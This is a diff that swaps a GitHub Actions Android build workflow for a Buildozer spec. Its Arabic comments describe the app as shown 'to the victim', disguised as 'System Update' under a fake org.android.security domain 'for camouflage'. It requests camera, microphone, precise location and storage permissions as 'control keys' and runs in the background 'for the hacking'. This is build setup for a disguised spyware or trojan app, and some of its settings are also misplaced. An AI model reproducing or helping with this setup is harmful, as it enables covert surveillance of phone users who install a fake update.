@@ -1,31 +1,37 @@
-name: Android Build
-on: [push, workflow_dispatch]
+[app]
+# (str) اسم التطبيق الذي سيظهر للضحية
+title = System Update
 
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
+# (str) اسم الحزمة الداخلي (يجب أن يكون فريداً)
+package.name = sysupdate
 
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.10'
+# (str) نطاق الحزمة (للتمويه)
+package.domain = org.android.security
 
-      - name: Install dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y build-essential git python3 autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev cmake libffi-dev libssl-dev
-          pip3 install --user --upgrade buildozer cython virtualenv
+# (str) ملف البداية (العقل الذي برمجناه)
+source.include_exts = py,png,jpg,kv,atlas
 
-      - name: Build with Buildozer
-        run: |
-          export PATH=$PATH:~/.local/bin
-          buildozer android debug
-        continue-on-error: true
+# (list) الأذونات المطلوبة (مفاتيح السيطرة)
+android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION
 
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
-        with:
-          name: My-App-Package
-          path: bin/*.apk
+# (int) نسخة الأندرويد المستهدفة
+android.api = 31
+
+# (str) اتجاه الشاشة
+orientation = portrait
+
+# (bool) هل يعمل التطبيق في الخلفية (ضروري جداً للاختراق)
+android.meta_data = {"android.permission.FOREGROUND_SERVICE": ""}
+
+# (list) المتطلبات البرمجية لعمل النواة
+requirements = python3,kivy,requests
+
+# (str) أيقونة التطبيق (يمكنك تركها افتراضية حالياً)
+# icon.filename = %(source.dir)s/data/icon.png
+
+[buildozer]
+# (int) مستوى التنبيهات أثناء البناء
+log_level = 2
+
+# (str) مسار البناء في السيرفر السحابي
+bin_dir = ./bin
